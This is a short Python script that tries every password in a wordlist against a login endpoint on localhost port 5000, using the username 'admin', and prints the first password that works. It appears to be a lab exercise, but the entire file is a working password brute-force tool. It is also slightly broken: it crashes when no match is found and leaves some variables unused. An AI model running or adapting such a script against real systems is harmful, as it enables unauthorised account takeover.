from sys import argv
import requests

script, filename, success_message = argv
txt = open(filename)

url = 'http://localhost:5000/'
s = requests.Session()

def test_authentication(username, password):
    url = 'http://127.0.0.1:5000/'
    params = {
        'username': username,
        'password': password
    }
    response = requests.get(url, params=params)
    
    if response.status_code == 200:
        return "Ok"
    else:
        return response.json()['message']

print ('URL' + url)

with open(filename) as f:
 print ('Running brute force attack...')
 for password in f:
  print ('password tryed: ' + password)
  password = password.strip()

  result = test_authentication('admin', password)

  if result == "Ok":
   print ('Password is: ' + password)
   success = True
   break

 if not success:
  print('Brute force failed. No matches found.')